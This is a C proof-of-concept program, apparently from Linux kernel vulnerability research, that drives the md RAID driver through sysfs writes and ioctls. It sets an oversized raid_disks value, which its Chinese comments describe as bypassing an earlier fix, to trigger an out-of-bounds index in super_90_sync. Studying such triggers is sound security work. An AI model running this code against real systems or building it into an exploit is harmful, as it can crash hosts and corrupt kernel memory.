#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

#define MD_MAJOR 9
/* _IOW(9, 0x23, mdu_array_info_t=72)  = 0x40480923 */
#define SET_ARRAY_INFO 0x40480923
/* _IOW(9, 0x21, mdu_disk_info_t=20)   = 0x40140921 */
#define ADD_NEW_DISK   0x40140921
/* _IOW(9, 0x30, mdu_param_t=12)       = 0x400c0930 */
#define RUN_ARRAY      0x400c0930
/* _IO(9, 0x12) */
#define STOP_ARRAY     0x0912

#define MD_DISK_ACTIVE 2
#define MD_DISK_SYNC   3

typedef struct {
    int number, major, minor, raid_disk, state;
} mdu_disk_info_t;

typedef struct {
    int major_version, minor_version, patch_version;
    unsigned int ctime;
    int level, size, nr_disks, raid_disks, md_minor, not_persistent;
    unsigned int utime;
    int state, active_disks, working_disks, failed_disks, spare_disks;
    int layout, chunk_size;
} mdu_array_info_t;

typedef struct { int personality, chunk_size, max_fault; } mdu_param_t;

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static long rdnum(const char *p)
{
    char b[64];
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atol(b);
}

static void mkdev(int n)
{
    char p[64];
    snprintf(p, sizeof(p), "/dev/md%d", n);
    if (access(p, F_OK) != 0)
        mknod(p, S_IFBLK | 0600, makedev(MD_MAJOR, n));
}

static void st(const char *t, long rc, int e)
{
    printf("%-32s rc=%ld errno=%d\n", t, rc, e);
    fflush(stdout);
}

int main(int argc, char **argv)
{
    int big = argc > 1 ? atoi(argv[1]) : 512;
    int n = 0;

    printf("=== GAP2 uid=%d big=%d ===\n", getuid(), big);
    fflush(stdout);

    mkdev(n);
    char dev[32], p[128];
    snprintf(dev, sizeof(dev), "/dev/md%d", n);

    int fd = open(dev, O_RDWR | O_EXCL);
    st("open md", fd, fd < 0 ? errno : 0);
    if (fd < 0) return 1;

    int e = 0, rc;

    /* 1. 先设 metadata 0.90 -> persistent=1, major_version=0 */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/metadata_version", n);
    e = 0; rc = wr(p, "0.90", &e);
    st("metadata_version=0.90", rc, e);

    /* 2. 用 sysfs 设超大 raid_disks（绕过 1a33a379e6 的关键） */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/raid_disks", n);
    char b[32]; snprintf(b, sizeof(b), "%d", big);
    e = 0; rc = wr(p, b, &e);
    st("raid_disks=big (sysfs)", rc, e);
    snprintf(p, sizeof(p), "/sys/block/md%d/md/raid_disks", n);
    printf("  raid_disks_now=%ld\n", rdnum(p));

    /* 3. 设 level */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/level", n);
    e = 0; rc = wr(p, "raid1", &e);
    st("level=raid1", rc, e);

    /* 4. 绑成员盘：persistent=1 会校验 superblock，预期失败；失败也继续 */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/new_dev", n);
    e = 0; rc = wr(p, "1:0", &e);
    st("new_dev 1:0", rc, e);

    /* 5. ioctl 路线：SET_ARRAY_INFO 不要求 superblock */
    mdu_array_info_t ai;
    memset(&ai, 0, sizeof(ai));
    ai.major_version = 0;
    ai.minor_version = 90;
    ai.level = 1;
    ai.size = 2048;
    ai.nr_disks = 1;
    ai.raid_disks = big;      /* ★ 再次尝试超大值 */
    ai.md_minor = n;
    ai.not_persistent = 0;    /* persistent 模式 */
    e = 0; rc = ioctl(fd, SET_ARRAY_INFO, &ai);
    st("ioctl SET_ARRAY_INFO", rc, rc < 0 ? errno : 0);

    mdu_disk_info_t di;
    memset(&di, 0, sizeof(di));
    di.number = 0; di.major = 1; di.minor = 0; di.raid_disk = 0;
    di.state = (1 << MD_DISK_ACTIVE) | (1 << MD_DISK_SYNC);
    e = 0; rc = ioctl(fd, ADD_NEW_DISK, &di);
    st("ioctl ADD_NEW_DISK", rc, rc < 0 ? errno : 0);

    mdu_param_t mp; memset(&mp, 0, sizeof(mp)); mp.personality = 1;
    e = 0; rc = ioctl(fd, RUN_ARRAY, &mp);
    st("ioctl RUN_ARRAY", rc, rc < 0 ? errno : 0);

    snprintf(p, sizeof(p), "/sys/block/md%d/md/array_state", n);
    e = 0; rc = wr(p, "active", &e);
    st("sysfs array_state=active", rc, e);

    /* 6. 强制 superblock 更新：写 clean 再写 active */
    e = 0; rc = wr(p, "clean", &e);
    st("array_state=clean", rc, e);

    /* 7. 若已 active，触发一次设备变更以更新 superblock */
    snprintf(p, sizeof(p), "/sys/block/md%d/md/dev-ram0/state", n);
    e = 0; rc = wr(p, "faulty", &e);
    st("dev state=faulty", rc, e);

    printf("=== 检查 dmesg 是否有 UBSAN array-index in super_90_sync ===\n");
    printf("=== GAP2 done ===\n");
    fflush(stdout);
    close(fd);
    return 0;
}